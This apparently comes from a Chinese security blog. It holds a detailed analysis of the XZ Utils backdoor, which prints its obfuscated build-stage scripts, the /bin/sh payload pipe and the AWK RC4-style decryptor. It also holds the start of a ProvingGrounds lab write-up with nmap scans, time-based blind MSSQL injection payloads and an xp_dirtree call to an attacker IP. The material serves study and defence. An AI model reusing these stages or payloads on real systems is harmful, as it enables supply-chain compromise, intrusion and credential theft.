sshd，使得攻击者可以构造特定请求，绕过密钥验证远程访问。 受影响的 xz-utils 包已经被并入 Debian testing 中进行测试，攻击者同时也在尝试并入 fedora 和 ubuntu。 幸运的是，注入的代码似乎存在某种 Bug，导致特定情况下 sshd 的 CPU占用飙升。被安全研究人员AndresFrund注意到了，并报告给 oss-security，致使此事败漏。如果不是因为这个 Bug，那么该后门很有可能被并入主流发行版的stable 版本，那么将形成一场前所未有的重大安全事件。 另外从一些细节能看出来攻击者非常用心: 攻击者抢在 ubuntu beta freeze 的几天前才尝试让新版本并入，以期望减少在测试期间被发现的时间。 xz-utils 项目的原维护者 Lasse Colin(Larhzu)，有着定期进行internetbreaks的习惯，而且最近正在进行，导致这些变动他并没有review的机会，即使到现在也没能联系上他本人。这可能也是攻击者选定xz-utils 项目的原因之一。 更多的细节还在被分析中，目前 GitHub 已经关停了整个 xz项目。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:3:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"技术细节 很值得关注的部分一是整个新式攻击手法模型，二是混淆手段和思路，还有就带有后门的混淆二进制文件本身了。 Andres Freund 邮件原文有后门程序的详细分析，但由于发现者不是安全研究人员，也不擅长逆向，所以都是以观察分析类发现为主。 推上@Thomas Roccia也制作了分析图： 详细展开下上述内容，将Stage 1 前的部分，暂时称为 Stage 0。 目前 GitHub 已经关停了整个 xz项目，但可以从 备份仓库 进行下载分析。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"Stage 0 从m4/build-to-host.m4文件开始。以下是相关代码片段： ... gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2\u003e/dev/null' ... gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"' ... 进行了一个字符替换，将制表符\\t、空格\\ 、连字符-、下划线_，依次替换为了空格\\ 、制表符\\t、下划线_、连字符- 这段代码在构建过程中的某个地方运行，提取第一阶段脚本。概述如下： sed \\\"r\\n\\\" $gl_am_configmake：读取 tests/files/bad-3-corrupt_lzma2.xz 文件中的字节，并用作下一步的输入。读取完所有内容后，会添加换行符\\n; 运行 tr 命令，进行字符替换，将选定的字符更改为其他字符，将制表符\\t、空格\\ 、连字符-、下划线_，依次替换为了空格\\ 、制表符\\t、下划线_、连字符-，它对tests/files/bad-3-corrupt_lzma2.xz 文件中的字节进行替换，这使得 bad-3-corrupt_lzma2.xz 再次形成了正确的 xz 流。 在此阶段的最后一步中，提取固定的 xz 字节流，并忽略错误（该流似乎被截断，但这并不重要，因为整个有意义的输出已被写出）。其结果是Stage 1的脚本，该脚本会立即执行。 下面是 5.6.0 版本解压后的Stage 1 脚本 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:1","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"Stage 1 在Andres 的电子邮件中是以“####Hello####”开头的 bash 文件。以下是 5.6.1版本 ####Hello#### # a few binary bytes here, but as it's a comment they are ignorred [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 eval `grep ^srcdir= config.status` if test -f ../../config.status;then eval `grep ^srcdir= ../../config.status` srcdir=\"../../$srcdir\" fi export i=\"((head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +939)\";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh ####World#### 可以看到5.6.0 和 5.6.1 的一些区别： 第一个区别是第二行注释中的随机字节。在5.6.0 是 86 F9 5A F7 2E 68 6A BC, 而在 5.6.1 是 E5 55 89 B7 24 04 D8 17. 暂时不确定这些差异是否有意义。 第二个区别是5.6.1版本添加了检测是否在 Linux 上运行代码，而它重复了 5 次，这很奇怪。 先分析第 2 阶段提取代码，即带有很多head的export i=... 行。进行简单拆分： export i=\"((head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +939)\"; (xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh 开头的export i=... 只是一个函数定义。它会在Stage 2 和 Stage 3 中被调用。 第 2 步是将 good-large_compressed.lzma 文件解压缩到标准输出 (xz -dc) ，并用作下一步的输入； 然后会调用 i 函数 (eval $i)。该函数基本上是一系列head调用，要么输出接下来的 N 个字节（head -c +N），要么跳过接下来的 N 个字节（head -c +N \u003e/dev/null）。i 函数最终实现：忽略 1024 个字节，再输出 2048 个字节，忽略 1024 个字节，再输出 2048 个字节…依此类推，直到到达文件的最末尾，其中只有 724 个字节（在 5.6.0 中）或 939输出字节（在 5.6.1 中）。 接下去执行 tail -c +31233 忽略数据的初始部分（tail -c +N 表示“从字节 N 开始输出”，注：初始部分隐藏了二进制后门，会将在下一阶段中提取）。在 5.6.0 中，这将是前 31264 个字节，在 5.6.1 中是 31232 。 第5步执行 tr 命令，用作简单的替换密码，密钥（字节值映射）在 5.6.0 和 5.6.1 中不同，两种情况下，都有 6 个范围映射到整个 0 - 255（即八进制 377）范围。 5.6.0: tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" 5.6.1: tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\" 在最后一步中，解密的数据被解压缩（xz -F raw --lzma1 -dc），并且立即执行Stage 2。 5.6.0 解压结果部分： P=\"-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections\" C=\"pic_flag=\\\" $P\\\"\" O=\"^pic_flag=\\\" -fPIC -DPIC\\\"$\" R=\"is_arch_extension_supported\" x=\"__get_cpuid(\" p=\"good-large_compressed.lzma\" U=\"bad-3-corrupt_lzma2.xz\" eval $zrKcVq if test -f config.status; then eval $zrKcSS eval `grep ^LD=\\'\\/ config.status` eval `grep ^CC=\\' config.status` eval `grep ^GCC=\\' config.status` eval `grep ^srcdir=\\' config.status` eval `grep ^build=\\'x86_64 config.status` eval `grep ^enable_shared=\\'yes\\' config.status` eval `grep ^enable_static=\\' config.status` eval `grep ^gl_path_map","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:2","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"Stage 2 Stage 2是 Andres 在原始电子邮件（即 5.6.0 版本）中附加的fected.txt 文件。这个 bash 脚本中发生了很多事情，因为这是实际编译过程修改发生的地方。 从混淆分析的角度来看，该脚本存在三个有趣的片段，其中两个仅出现在5.6.1版本中。 扩展 机制 片段1 vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2\u003e/dev/null` if test \"x$vs\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f1=`echo $vs | cut -d: -f1` if test \"x$f1\" != \"x\" \u003e /dev/null 2\u003e\u00261;then start=`expr $(echo $vs | cut -d: -f2) + 7` ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2\u003e/dev/null` if test \"x$ve\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f2=`echo $ve | cut -d: -f1` if test \"x$f2\" != \"x\" \u003e /dev/null 2\u003e\u00261;then [ ! \"x$f2\" = \"x$f1\" ] \u0026\u0026 exit 0 [ ! -f $f1 ] \u0026\u0026 exit 0 end=`expr $(echo $ve | cut -d: -f2) - $start` eval `cat $f1 | tail -c +${start} | head -c +${end} | tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" | xz -F raw --lzma2 -dc` fi fi fi fi 片段3： vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2\u003e/dev/null` if test \"x$vs\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f1=`echo $vs | cut -d: -f1` if test \"x$f1\" != \"x\" \u003e /dev/null 2\u003e\u00261;then start=`expr $(echo $vs | cut -d: -f2) + 7` ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2\u003e/dev/null` if test \"x$ve\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f2=`echo $ve | cut -d: -f1` if test \"x$f2\" != \"x\" \u003e /dev/null 2\u003e\u00261;then [ ! \"x$f2\" = \"x$f1\" ] \u0026\u0026 exit 0 [ ! -f $f1 ] \u0026\u0026 exit 0 end=`expr $(echo $ve | cut -d: -f2) - $start` eval `cat $f1 | tail -c +${start} | head -c +${end} | tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" | xz -F raw --lzma2 -dc` fi fi fi fi 这两个片段几乎相同，所以可以一起处理它们。 首先，他们尝试在tests/files/目录中查找（grep -broaF）两个文件，其中包含以下字节（签名） Fragment 1: \"~!:_ W\" and \"|_!{ -\" Fragment 3: \"jV!.^%\" and \"%.R.1Z\" # 注：grep 实际输出格式如下：file_name:offset:signature。例如： $ grep -broaF \"XYZ\" testfile:9:XYZ 如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符，采用第二个字段），第一个偏移量 + 7 保存为 $start，第二个文件的第二个偏移量 - $start 保存作为 $end. 一旦脚本有了 $start 和 $end 偏移量，它就会切出文件中具有第一个签名的部分 cat $f1 | tail -c +${start} | head -c +${end} 接下来先是替换密码（使用 5.6.0 版本密钥）：tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" 然后解压数据以便立即执行： eval `... | xz -F raw --lzma2 -dc` 事实上，在现有的5.6.0和5.6.1的TAR存档中都没发现任何带有签名的文件，看上去像是一个待使用的“扩展插件”系统，允许未来添加脚本以在该阶段的上下文中运行，而无需修改原始的负载文件。毕竟，不断地修改 bad 和 good 测试文件很可疑。 目标选择 此脚本会检查各种条件，例如计算机的体系结构。 if ! (echo \"$build\" | grep -Eq \"^x86_64\" \u003e /dev/null 2\u003e\u00261) \u0026\u0026 (echo \"$build\" | grep -Eq \"linux-gnu$\" \u003e /dev/null 2\u003e\u00261);then 如果 amd64/x86_64 是构建的目标 如果目标使用名称 linux-gnu （主要是检查是否使用了 glibc） 它还会检查正在使用的工具链： if test \"x$GCC\" != 'xyes' \u003e /dev/null 2\u003e\u00261;then exit 0 fi if test \"x$CC\" != 'xgcc' \u003e /dev/null 2\u003e\u00261;then exit 0 fi LDv=$LD\" -v\" if ! $LDv 2\u003e\u00261 | grep -qs 'GNU ld' \u003e /dev/null 2\u003e\u00261;then exit 0 如果正在尝试复现构建 Debian 或 Red Hat 软件包： if test -f \"$srcdir/debian/rules\" || test \"x$RPM_ARCH\" = \"xx86_64\";then 因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。 其他系统目前可能容易受到攻击，但没有明确的证据。 后门提取 正如 Andres 在原始电子邮件中指出的那样，在某些时候会提取 .o 文件并将其编织到编译/链接过程中。由以下代码负责 N=0 W=88664 else N=88664 W=0 fi xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed \"s/\\(.\\)/\\1\\n/g\" | LC_ALL=C awk 'BEGIN{FS=\"\\n\";RS=\"\\n\";ORS=\"\";m=256;for(i=0;i\u003cm;i++){t[sprintf(\"x%c\",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l\u003c8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[\"x\" (NF\u003c1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf \"%c\",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N \u003e /dev/null 2\u003e\u00261) \u0026\u0026 head -c +$W) \u003e liblzma_la-crc64-fast.o || true 版本之间的差异归结为有损压缩(compressed-but-somewhat-mangled)的有效负载的大小，在 5.6.0 中是 88792，在 5.6.1 中是 88664，AWK 脚本中的一个值发生了变化，我们稍后会介绍这一点。 实际上某些步骤与Stage 1相同（它的二进制 payload 在“good”文件数据中先前被忽略的部分中）。 与Stage 1 中的步骤 2 相同，用xz解压 tests/files/good-large_compressed.lzma 文件 与Stage 1 中的步骤 3 相同，即“很多 head 函数”调用。 这有不同了。首先之前的输出被 sed 命令破坏了。LC_ALL=C sed \"s/\\(.\\)/\\1\\n/g\" 其作用实际上是在每个字节后面放置一个换行符（换行符本身除外）。因此，我们最终在输出中得到的是每行字节的情况（这里有很多混合“文本”和“二进制”文件）。这正是下一步所需要的。 下一步是 AWK 脚本，它对输入流进行 RC4…ish 描述。 BEGIN { # Initialization part. FS = \"\\n\"; # Some AWK settings. RS = \"\\n\"; ORS = \"\"; m = 256; for(i=0;i\u003cm;i++) { t[sprintf(\"x%key\", i)] = i; key[i] = ((i * 7) + 5) % m; # Creating the cipher key. } i=0; # Skipping 4096 first byte","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:3","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":".o二进制分析 这块我不擅长，就不班门弄斧了。 关于.o二进制文件的分析，可以参考这篇文章，文中对二进制文件中很多函数功能都有相应的推测，可以进行参考。 逆向后的项目，基于xz 5.6.1版本，可见：https://github.com/smx-smx/xzre，该项目是基于xz 5.6.1版本。 国内也有篇文章分析的很好：XZ开源项目投毒事件深入解析 该后门首先在 sshd 启动时替换 crc32_resolve() 和 crc64_resolve，然后试图从内存中解析符号表，并查找 RSA_public_decrypt@....plt 符号，并将其指向的地址替换为后门代码。 在 SSH 登录认证时，sshd 会调用该符号，并在服务器上执行攻击代码。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:4","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"后门设计分析 此后门程序包含多个组件。在高层次上： 上游发布的发布压缩包与 GitHub 的代码不同。这在 C 项目中很常见，因此下游使用者不需要记住如何运行 autotools 和 autoconf。发布版中的压缩包版本 build-to-host.m4 与 GitHub 上的上游版本有很大不同。 git 存储库中的 tests/ 文件夹中也有精心设计的测试文件。这些文件位于以下提交中： tests/files/bad-3-corrupt_lzma2.xz (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1) tests/files/good-large_compressed.lzma (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1) 由 build-to-host.m4 调用的脚本解压缩此恶意测试数据，并使用它来修改生成过程。 IFUNC 是 glibc 中允许间接函数调用的一种机制，用于执行 OpenSSH 身份验证例程的运行时挂钩/重定向。IFUNC 是一种通常用于合法事物的工具，但在这种情况下，它被用于此攻击路径。 通常，上游发布的 tarball 与 GitHub 中自动生成的 tarball 不同。在这些修改后的 tarball 中，包含一个恶意版本 build-to-host.m4 ，用于在构建过程中执行脚本。 整起事件隐匿的很好，从用于存储payload的二进制测试文件，到文件内容雕刻、替换密码和 AWK 中实现的 RC4 变体，所有这些都只需使用标准命令行工具即可完成。 所有这一切都在 3 个执行阶段中进行，并通过“扩展”系统实现面向未来的事物，而不必再次更改二进制测试文件。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:5","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"payload 分析 如果上述后门条件得到满足，payload将运行并注入到源代码树中。以下是我所知道的主要内容： 如果正在运行的程序具有进程名称 /usr/sbin/sshd ，则payload将激活。 它也可能在其他场景中激活，甚至可能与 ssh 无关。 暂不清楚有效载荷的目的是做什么，正在调查。 Vanilla 上游 OpenSSH 不受影响，除非其依赖项链接 liblzma 之一。 Lennart Poettering 曾提到它可能通过 pam-\u003elibselinux-\u003eliblzma 发生，也可能在其他情况下发生，但是…… libselinux 没有链接到 liblzma。事实证明，这种混淆是因为 Fedora 中一个旧的仅限下游的补丁和 RPM 规范中陈旧的依赖关系，这种依赖关系在删除后很长一段时间内仍然存在。 PAM 模块在进程 AFAIK 中加载得太晚，无法正常工作（另一个可能的例子是 pam_fprintd ）。Solar Designer 在 oss-security 上也提出了这个问题。 payload被间接加载到 sshd 。 sshd 通常被 patch 以支持 systemd-notify，以便在 SSHD 运行时可以启动其他服务。 加载liblzma是因为它被 libsystemd 的其他部分所依赖，这不是systemd的错。大多数发行版使用的补丁都可以在这里找到：openssh/openssh-portable#375。 更新：OpenSSH开发人员正在考虑添加systemd-notify协议的非库集成，这意味着发行版将不再支持 patch libsystemd 。 如果此payload加载到 openssh 的sshd 中，则该 RSA_public_decrypt 函数将被重定向到恶意实现中。这种恶意实现可用于绕过身份验证。 Filippo Valsorda 分享的分析表明，攻击者必须提供一个由payload验证的密钥，然后将攻击者的输入传递给 system() ，从而提供远程代码执行 （RCE）。 关于更多Payload分析，可以关注些大佬们的进度和项目情况： Filippo Valsorda 的分析线程：https://bsky.app/profile/did:plc:x2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b 通过 @smx-smx （WIP） 进行 XZ 后门分析：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504 modify_ssh_rsa_pubkey.py by @keeganyan - 脚本来触发受感染 sshd 的有效负载的更多部分 xz-恶意软件https://github.com/karcherm/xz-malware xz-后门https://github.com/hamarituc/xz-backdoor ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:6","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"xz bits Jia Tan 的 328c52da8a2bbb81307644efdb58db2c422d9ba7 提交在 CMake 检查中包含一个 . landlock 沙盒支持。这导致检查始终失败，因此没有检测到缺少支持。 check_c_source_compiles 有人提议对 CMake 进行强化（参见其他项目）。 IFUNC 由 Hans Jensen 在 ee44863ae88e377a5df10db007ba9bfadde3d314 中为 crc64 引入。 Hans Jensen 后来继续要求 Debian 在 https://bugs.debian.org/1067708 中更新 xz-utils，但对于热心的用户来说，这是一件很常见的事情，所以它不一定是邪恶的。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:7","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"人员分析 我暂时不在本文档中推测这个项目背后的人。执法部门将能够识别责任人。他们可能也在修补他们的系统。 xz-utils 有两个维护者： Lasse Collin （Larhzu） 从一开始就维护 xz（~2009 年），在此之前， lzma-utils . Jia Tan （JiaT75） 在过去 2-2.5 年内开始为 xz 做贡献，并在大约 1.5 年前获得了提交访问权限，然后获得了发布管理员权限。他于 2024 年 3 月 31 日被撤职，因为 Lasse 开始了他未来的长期工作。 分析人员Lasse 目前在这一切开始之前就开始了人员分析。他在 https://tukaani.org/xz-backdoor/ 上发布了更新，并正在与社区合作进行一步分析处理。请耐心等待他，因为他会加快速度并花时间仔细分析情况。 本次事件的主角是Jia Tan （JiaT75），根据他的名字，他希望人们相信他是亚洲人，特并且他的绝大多数提交都是 UTC+08 时间戳。 然而，我更相信他实际上来自 UTC+02/UTC+03时区的某个地方，其中包括东欧（EET）、以色列（IST）等。他通常早上 9 点到下午 6 点工作（根据 EET 调整）。这比在周二晚上午夜和凌晨 1 点工作的人更合理（使用 UTC+08）。 关于这些，详情可见：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:8","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"漏洞利用 github已有公开的demo exp，这个exp通过patch后门中的公钥为自己的私钥来验证漏洞的存在。 见 https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg 已有复现 下载了debian官方编译的deb包。安装之后使用patch.py脚本手动patch。 然后启动sshd进程，使其监听在2222端口。 之后运行exploit，执行的命令为id \u003e /tmp/.xz。 运行之后可以看到命令成功被执行，并且命令执行的权限为root。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:5:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"后续影响 有很多人讨论说很大可能是国家级的供应链攻击， XZ攻击的复杂程度和攻击模型流程都非常夸张 这是一起偶然发现的事件，那么还有多少事情未被发现。冰山之下还有多少？ 推动了开源社区的反间谍类安全意识问题发现，很多开源社区近期都在筛查这种同类问题。 开源产品的维护，当整个产品基于一个过度劳累的人身上时，在没有任何财务或运营上的支持，很容易慢慢出现心理健康危机。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:6:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"参考链接 Andres Freund 邮件原文：https://www.openwall.com/lists/oss-security/2024/03/29/4 奇安信Cert https://mp.weixin.qq.com/s/F2k1bPmCuqwUAZkNiIFA-w Everything I Know About the Xz Backdoor: https://boehs.org/node/everything-i-know-about-the-xz-backdoor xz 后门镜像地址 https://github.com/thesamesam/xz-archive xz/liblzma: Bash-stage Obfuscation Explained : https://gynvael.coldwind.pl/?lang=en\u0026id=782#stage2-ext FAQ on the xz-utils backdoor (CVE-2024-3094) https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27 XZ Backdoor Analysis：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504 xzre：https://github.com/smx-smx/xzre XZ Backdoor: Times, damned times, and scams：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and XZ开源项目投毒事件深入解析：https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:7:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["靶场"],"content":"Butch 这是第26台，Windows系统，难度中等，名称 Butch If you know your ASP.NET, you will be fine. Otherwise, this machine will teach you some of that. 192.168.225.63 ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.225.63 -T4 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-12 16:12 CST Nmap scan report for 192.168.225.63 Host is up (0.19s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 25/tcp open smtp Microsoft ESMTP 10.0.17763.1 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.13 seconds 全端口： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.225.63 -T4 -p- …… PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 25/tcp open smtp Microsoft ESMTP 10.0.17763.1 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 450/tcp open http Microsoft IIS httpd 10.0 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"InitAccess 尝试了ftp匿名登录，SMB匿名访问无果。 ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"450-Web ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"SQL注入 访问 450 端口是个Web页面的登录口，没有账号密码，测试发现存在SQL注入。 exec master.dbo.xp_dirtree '\\\\192.168.45.164\\123';-- sudo responder -I tun0 失败，xp_cmdshell失败 只能老老实实的去注入了 # 枚举数据库名 admin'if(len(db_name()))\u003e=0+waitfor+delay+'0:0:2';-- admin'if(substring(db_name(),1,1))\u003e='c'+waitfor+delay+'0:0:2';-- # 最终得到数据库名为butch # 枚举表名 admin'if((select+count(name)+from+butch..sysobjects+where+xtype='u'))\u003e=0+waitfor+delay+'0:0:2';-- # 有1张表 admin'if((select+len(name)+from+butch..sysobjects+where+xtype='u'))\u003e=0+waitfor+delay+'0:0:2';-- # 表名长度为5 admin'if((select+substring(name,1,1)+from+butch..sysobjects+where+xtype='u'))\u003e='u'+waitfor+delay+'0:0:2';-- # 得到表名为 users # 枚举列名 admin'if((select+count(name)+from+syscolumns+where+id=OBJECT_ID('users')))\u003e=4+waitfor+delay+'0:0:2';-- # 有3列 admin'if((select+top+1+len(name)+from+syscolumns+where+id=OBJECT_ID('users')))\u003e=13+waitfor+delay+'0:0:2';-- #第一列列名长度为13 admin'if((select+top+1+substring(name,1,1)+from+syscolumns+where+id=OBJECT_ID('users')))\u003e='p'+waitfor+delay+'0:0:2';-- # 得到列名为password_hash,user_id,username # 枚举字段值 